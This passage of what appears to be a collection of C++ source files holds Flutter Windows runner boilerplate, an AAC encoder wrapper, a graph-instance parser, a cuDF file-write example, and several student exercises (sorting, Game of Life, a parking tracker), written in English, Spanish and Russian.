0){\r\n\t\tsin >> x >> y;\r\n\t\tif(simpleInstancePattern == 1){\r\n\t\t\tx++;\r\n\t\t\ty++;\r\n\t\t}\r\n\t}else{\r\n\t\tsin >> edgeId >> x >> y;\r\n\t}\r\n\tnodes[x-1].push_back(y-1);\r\n\tnodes[y-1].push_back(x-1);\r\n}\r\n\r\nbool GrundyInstance::isEOF(const std::string& line) const {\r\n\tif(line.find(\"EOF\") == std::string::npos || line == \"\") { return false; }\r\n\treturn true;\r\n}\r\n\r\nvoid GrundyInstance::trim(std::string& str) const {\r\n\t// trim white spaces at the beginning:\r\n\tunsigned begin = 0;\r\n\twhile(begin < str.size() && str[begin] == ' ') { ++begin; }\r\n\r\n\tunsigned end = str.size() - 1;\r\n\twhile(end > 0 && str[end] == ' ') { --end; }\r\n\r\n\tstr = str.substr(begin, end - begin + 1);\r\n}\r\n\r\nvoid GrundyInstance::writeOutput(const std::string outputFile, const std::string instanceFile, \r\n\tconst int maxColor, const std::string solverType, bool validSolution, double executionTime, \r\n\tdouble pe, double pm, double rhoe, int generation, unsigned relGeneration, double relGenerationTime){\r\n\r\n\tstd::ofstream ofs;\r\n\tofs.open(outputFile.c_str(), std::ofstream::out | std::ofstream::app);\r\n\r\n\tofs << instanceFile << \";\" << maxColor << \";\" << validSolution << \";\" << executionTime << \";\" \r\n\t<< pe << \";\" << pm << \";\" << rhoe << \";\" << generation << \";\" << relGeneration << \";\" \r\n\t<< relGenerationTime << \"\\n\";\r\n\tofs.close();\r\n}\r\n\r\nint GrundyInstance::getNumberOfNeighbors(int vertex) const {\r\n\treturn nodes[vertex].size();\r\n}\r\n\r\nint GrundyInstance::getMaxDegree() const {\r\n\treturn maxDegree;\r\n}\r\n",
    "#include<iostream>\r\n#include<time.h>\r\n#include<vector>\r\nusing namespace std;\r\nclass Persona{\r\n\tprivate:\r\n\t\tstring nombre;\r\n\t\tint edad;\r\n\tpublic:\r\n\t\tPersona();\r\n\t\tvoid setNombre(string nombre);\r\n\t\tvoid setEdad(int edad);\r\n\t\tstring getNombre();\r\n\t\tint getEdad();\r\n\t\tstring mostrarDatos();\t\t\r\n};\r\nPersona::Persona(){\r\n\tnombre=\"S/N\";\r\n\tedad=0;\r\n};\r\nvoid Persona::setNombre(string nombre){\r\n\tthis->nombre=nombre;\r\n};\r\nvoid Persona::setEdad(int edad){\r\n\tthis->edad=edad;\t\r\n};\r\nstring Persona::getNombre(){\r\n\treturn nombre;\t\r\n};\r\nint Persona::getEdad(){\r\n\treturn edad;\t\r\n};\r\nstring Persona::mostrarDatos(){\r\n\treturn (nombre+\"\\t\"+to_string(edad));\r\n};\r\nvoid ingresoDatos(vector<Persona> &listado, int numElementos);\r\nvoid mostrarDatos(vector<Persona> listado, string titulo);\r\nvoid ordenaSeleccion(vector<Persona> &listado);\r\nint main(){\r\n\tvector<Persona> listado;\r\n\t\r\n\tint numElementos;//1-100\r\n\tdo{\r\n\t\tcout<<\"Numero de elementos: \";\r\n\t\tcin>>numElementos;\r\n\t\tif(numElementos<2 || numElementos>100){\r\n\t\t\tcout<<\"\\tError...!!!\\n\";\r\n\t\t}\r\n\t}while(numElementos<2 || numElementos>100);\t\r\n\t//ingreso de datos\t\r\n\tingresoDatos(listado,numElementos);\r\n\tmostrarDatos(listado, \"datos\");\r\n\tordenaSeleccion(listado);\r\n\tmostrarDatos(listado, \"datos ordenados\");\r\n\treturn 0;\r\n};void ingresoDatos(vector<Persona> &listado, int numElementos){\r\n\tPersona persona;\r\n\tstring nombre;\r\n\tint edad;\r\n\tfor(int i=0;i<numElementos;i++){\r\n\t\tcout<<\"Ingrese el nombre: \";\r\n\t\tgetline(cin>>ws,nombre);\r\n\t\tcout<<\"Ingrese la edad: \";\r\n\t\tcin>>edad;\r\n\t\t//guadar\r\n\t\tpersona.setNombre(nombre);\r\n\t\tpersona.setEdad(edad);\r\n\t\tlistado.push_back(persona);\r\n\r\n\t}\r\n};\r\nvoid mostrarDatos(vector<Persona> listado, string titulo){\r\n\tcout<<\"\\n******* \"<<titulo<<\" *******\\n\";\r\n\tPersona persona;\r\n\tfor(auto i: listado){\r\n\t\tpersona=i;\r\n\t\tcout<<persona.mostrarDatos()<<endl;\r\n\t}\r\n};\r\nvoid ordenaSeleccion(vector<Persona> &listado){\r\n\tint minimo;\r\n\tfor(int i=0;i<listado.size();i++){\r\n\t\tminimo=i;\r\n\t\tfor(int j=i+1;j<listado.size();j++){\r\n\t\t\tif(listado[j].getNombre()<listado[minimo].getNombre()){\r\n\t\t\t\tminimo=j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tswap(listado[i],listado[minimo]);\r\n\t}\t\r\n};",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include \"estructura.h\"\nusing namespace std;\n\nint main() {\n\n    //Crear Estructura de datos\n    Estructura* data = new Estructura();\n\n    //Cargar datos a la estructura\n    if ( !data->CargarDatos() ){\n        cout<<\"> Hubo un error al cargar los datos\"<<endl;\n        cout<<\"> Cerrando programa . . .\"<<endl;\n        return 0;\n    }\n\n    //Iniciar menu\n    int rpta = -1;\n    while (rpta != 0)\n    {\n        rpta = -1;\n        cout<<\"> Que operacion deseas realizar?\"<<endl;\n        \n        while ( !(0<=rpta && rpta<=5) )\n        {\n            cin>>rpta;\n        }\n\n        switch (rpta)\n        {\n        case 0:\n            break;\n\n        case 1:\n            cout<<\"> Elegiste la 1\"<<endl;\n            data->Insertar(1);\n            break;\n\n        case 2:\n            cout<<\"> Elegiste la 2\"<<endl;\n            data->Buscar(1);\n            break;\n        \n        case 3:\n            cout<<\"> Elegiste la 3\"<<endl;\n            break;\n        \n        default:\n            cout<<\"> Debes elegir una de las opciones validas\"<<endl;\n            break;\n        }\n\n    }\n    \n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"projecto2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"madsoft_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n * Copyright (c) 2018, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n * */\n\n#include \"aacEncode.h\"\n#include \"aacenc_lib.h\"\n#include <utils/Log.h>\n#include <string.h>\n\nstruct aacInfo\n{\n    AACENC_BufDesc inBuff;\n    AACENC_BufDesc outBuff;\n    AACENC_InArgs  inArg;\n    AACENC_OutArgs outArg;\n};\n\naacEncode::aacEncode() {\n    p_aacHandle = NULL;\n    p_aacInfo = NULL;\n    memset(&s_aacConfig, 0, sizeof(s_aacConfig));\n}\n\naacEncode::~aacEncode() {\n    if(!p_aacHandle) {\n        return;\n    }\n\n    if(aacEncClose((HANDLE_AACENCODER*)(&p_aacHandle)) != AACENC_OK) {\n        ALOGE(\"aacEncClose Failed\");\n        return;\n    }\n}\n\nbool aacEncode::aacConfigure(aacConfigType * p_aacConfig) {\n    if(!p_aacConfig) {\n        return false;\n    }\n\n    memcpy(&s_aacConfig, p_aacConfig, sizeof(s_aacConfig));\n\n    /* Configure AAC encoder here */\n\n    AACENC_ERROR err = AACENC_OK;\n\n    p_aacInfo = (void*)new(aacInfo);\n    if(!p_aacInfo) {\n        ALOGE(\"Failed to allocate aacInfo\");\n        return false;\n    }\n\n    /* Open AAC encoder */\n    err = aacEncOpen((HANDLE_AACENCODER*)(&p_aacHandle),\n                      0x01 /* AAC */,\n                      s_aacConfig.n_channels);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed top open AAC encoder\");\n        return false;\n    }\n\n    /* Set Bitrate and SampleRate */\n    err = aacEncoder_SetParam((HANDLE_AACENCODER)p_aacHandle,\n                               AACENC_BITRATE,\n                               s_aacConfig.n_bitrate);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed to set bitrate param to AAC encoder\");\n        return false;\n    }\n\n    err = aacEncoder_SetParam((HANDLE_AACENCODER)p_aacHandle,\n                                   AACENC_SAMPLERATE,\n                                   s_aacConfig.n_sampleRate);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed to set samplerate param to AAC encoder\");\n        return false;\n    }\n\n    /* Fix Channel mode and order */\n    /* TODO */\n\n    /* Prefill encode structures */\n    /* TODO */\n\n    return true;\n}\n\nbool aacEncode::aacEncodeFrame(unsigned char * p_inBuffer,\n                              unsigned int n_inSize,\n                              unsigned char * p_outBuffer,\n                              unsigned int n_outSize,\n                              unsigned int * p_length) {\n    (void)n_inSize;\n    (void)n_outSize;\n    (void)p_length;\n    if(!p_inBuffer || !p_outBuffer) {\n        ALOGE(\"No buffers provided for AAC encoder\");\n        return false;\n    }\n\n    aacInfo *tempAacInfo = (aacInfo*)p_aacInfo;\n    tempAacInfo->inBuff.bufs = (void**) (&p_inBuffer);\n    tempAacInfo->outBuff.bufs = (void**) (&p_outBuffer);\n\n    AACENC_ERROR err = AACENC_OK;\n\n    if(p_aacHandle) {\n        err = aacEncEncode((HANDLE_AACENCODER)p_aacHandle,\n                           &tempAacInfo->inBuff,\n                           &tempAacInfo->outBuff,\n                           &tempAacInfo->inArg,\n                           &tempAacInfo->outArg);\n\n        if(err != AACENC_OK) {\n            ALOGE(\"Failed to encode buffer\");\n            return false;\n        }\n    } else {\n        ALOGE(\"No encoder available\");\n        return false;\n    }\n\n    return true;\n}\n",
    "#include <iostream>\n#include <windows.h>\n#include <random>\n\nusing namespace std;\n\nchar living_cell = '1', dead_cell = '_'; // \u0441\u0438\u043c\u0432\u043e\u043b\u044b, \u043e\u0431\u043e\u0437\u043d\u0447\u0430\u044e\u0449\u0438\u0435 \u0436\u0438\u0432\u0443\u044e \u0438 \u043c\u0451\u0440\u0442\u0432\u0443\u044e \u043a\u043b\u0435\u0442\u043a\u0443\nint pause = 3500; // \u0434\u043b\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u043f\u0430\u0443\u0437\u044b \u043c\u0435\u0436\u0434\u0443 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435\u043c \u043f\u043e\u043b\u044f (\u0432 \u043c\u0438\u043b\u0438\u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\nint frequency_died_cell = 80; // \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c, \u0447\u0442\u043e \u0432 \u0438\u0437\u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u043c \u043f\u043e\u043b\u0435 \u043a\u043b\u0435\u0442\u043a\u0430 \u0431\u0443\u0434\u0435\u0442 \u043c\u0451\u0440\u0442\u0432\u043e\u0439\nint quantity_living_cell_to_revive_cell = 3; // \u043a\u043e\u043b-\u0432\u043e \u043a\u043b\u0435\u0442\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u043d\u0443\u0436\u043d\u043e \u0434\u043b\u044f \u043e\u0436\u0438\u0432\u0430\u043d\u0438\u044f \u0441\u043e\u0441\u0435\u0434\u043d\u0435\u0439 \u043a\u043b\u0435\u0442\u043a\u0438\n\n\n// \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043f\u043e\u0434\u0445\u043e\u0434\u0438\u0442 \u043b\u0438 \u043a\u043b\u0435\u0442\u043a\u0430 \u0434\u043b\u044f \u043e\u0436\u0438\u0432\u043b\u0435\u043d\u0438\u044f, \u043f\u043e\u0441\u0447\u0438\u0442\u0430\u0432 \u043a\u043e\u043b-\u0432\u043e \u0436\u0438\u0432\u044b\u0445 \u0441\u043e\u0441\u0435\u0434\u043d\u0438\u0445 \u043a\u043b\u0435\u0442\u043e\u043a\nbool condition(char** field, int index_x, int index_y, int size)\n{\n    int count_living_cell = 0;\n    if (index_y > 0)\n    {\n        if (index_x > 0 and field[index_y - 1][index_x - 1] == living_cell) count_living_cell++;\n        if (field[index_y - 1][index_x] == living_cell) count_living_cell++;\n        if (index_x + 1 < size and field[index_y - 1][index_x + 1]) count_living_cell++;\n    }\n\n    if (index_x > 0 and field[index_y][index_x - 1] == living_cell) count_living_cell++;\n    if (index_x + 1 < size and field[index_y][index_x + 1] == living_cell) count_living_cell++;\n\n    if (index_y + 1 < size)\n    {\n        if (index_x > 0 and field[index_y + 1][index_x - 1] == living_cell) count_living_cell++;\n        if (field[index_y + 1][index_x] == living_cell) count_living_cell++;\n        if (index_x + 1 < size and field[index_y + 1][index_x + 1] == living_cell) count_living_cell++;\n    }\n    \n    if (count_living_cell == quantity_living_cell_to_revive_cell) \n        return true;\n    else \n        return false;\n}\n\n\nvoid generate_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        for (int j = 0; j < size; j++)\n        {\n            if (rand() % 100 > frequency_died_cell)\n                field[i][j] = living_cell;\n            else\n                field[i][j] = dead_cell;\n        }\n    }\n}\n\n\nvoid show_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        cout.write(field[i], size);\n        cout << endl;\n    }\n}\n\n\nvoid update_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        for (int j = 0; j < size; j++)\n        {\n            if (condition(field, j, i, size)) \n                field[i][j] = living_cell;\n            else \n                field[i][j] = dead_cell;\n        }\n    }\n}\n\n\nint main()\n{\n    setlocale(LC_ALL, \"ru\");\n    int size;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u043b\u044f:\\n\";\n    cin >> size;\n    char **field = new char *[size];\n    for (int i = 0; i < size; i++)\n    {\n        field[i] = new char[size];\n    }\n\n    generate_field(field, size);\n    show_field(field, size);\n    Sleep(pause);\n\n    while (true)\n    {\n        update_field(field, size);\n        show_field(field, size);\n        Sleep(pause);\n        system(\"cls\");\n    }\n\n    for (int i = 0; i < size; i++)\n    {\n        delete[] field[i];\n    }\n    delete[] field;\n\n    system(\"PAUSE >> VOID\");\n    return 0;\n}\n",
    "//A program that keeps track of the cars parked in MEDIU's parking zone\r\n#include <iostream>\r\nusing namespace std;\r\n// make a struct that contains the cars' information\r\nstruct car {\r\n  string ownername, brand, model, make, platenumber;\r\n  int year, oldestmake;\r\n};\r\n\r\n\r\nint main ()\r\n{\r\n  string model, brand, ownername, platenumber, oldestmodel;\r\n  int i, carnum, proton = 0, maxyear = 2022, oldestmake = 0;\r\n  car cars[carnum];\r\n  \r\n  cout << \"This is a program that keeps track of the cars parked in MEDIU's parking zone.\" << endl << endl;\r\n  cout << \"Enter the number of cars you will enter: \";\r\n  cin >> carnum; // number of cars that will be inputed (number of times the loop will repeat)\r\n  \r\n  // make a loop which includes asking for each of the desired car information\r\n  for (int i = 0; i < carnum; i++)\r\n{\r\n\t\r\ncout << \"Enter owner name: \";\r\ncin >> cars[i].ownername;\r\ncout << \"Enter brand: \";\r\ncin >> cars[i].brand;\r\ncout << \"Enter model: \";\r\ncin >> cars[i].model;\r\ncout << \"Enter make: \";\r\ncin >> cars[i].make;\r\ncout << \"Enter plate number: \";\r\ncin >> cars[i].platenumber;\r\ncout << \"Enter year: \";\r\ncin >> cars[i].year;\r\ncout << endl;\r\n\r\n// get the oldest brand and model\r\nif (cars[i].year < maxyear) \r\n{\r\nbrand = cars[i].brand;\r\nmodel = cars[i].model;\r\n\r\n}  \r\n// count the number of times the word proton is entered in the model\r\n    if (cars[i].model == \"proton\") \r\n    { \r\n    proton++; \r\n    } \r\n}\r\n\r\ncout << endl << endl;\r\n\r\ncout << \"The oldest car brand is: \" << brand << endl; // display the oldest car brad\r\ncout << \"The oldest car model is: \" << model << endl; // display the oldest car model\r\ncout << \"The number of proton car(s) parked there is: \" << proton++ << endl; // display the number of times the word proton is repeated\r\n    \r\n\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"cuda_runtime_api.h\"\n#include <iostream>\n\n#include <cudf/table/table.hpp>\n#include <cudf_test/column_wrapper.hpp>\n#include <kvikio/file_handle.hpp>\n\nint main(int argc, char** argv) {\n  cudf::test::fixed_width_column_wrapper<int8_t> As{{65, 65, 65, 65, 65, 65, 65, 65, 65, 65}};\n  cudf::test::fixed_width_column_wrapper<int32_t> Seq{{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}};\n\n  auto col1 = As.release();\n  auto col2 = Seq.release();\n\n  std::vector<std::unique_ptr<cudf::column>> cols;\n  cols.emplace_back(std::move(col1));\n  cols.emplace_back(std::move(col2));\n  auto table = std::make_unique<cudf::table>(std::move(cols));\n\n  auto table_view = table->select({0, 1});\n\n  try {\n    auto col_view = table_view.column(0);\n    std::size_t size = col_view.size() * sizeof(int8_t);\n    std::cout << \"Column \" << 0 << \" has \" << col_view.size() << \" bytes worth data\" << std::endl;\n\n    auto col1_dev_ptr = col_view.data<int8_t>();\n    off_t file_offset = 0;\n    off_t devptr_offset = 0;\n    ssize_t bytes_written = 0;\n\n    kvikio::FileHandle file_handle(argv[1], \"w\", kvikio::FileHandle::m644, false);\n    file_handle.write_async((char*)col1_dev_ptr, &size, &file_offset, &devptr_offset, &bytes_written, 0);\n    std::cout << \"Write requested for \" << size << \" bytes\" << std::endl;\n    CUDF_CUDA_TRY(cudaStreamSynchronize(0));\n    std::cout << 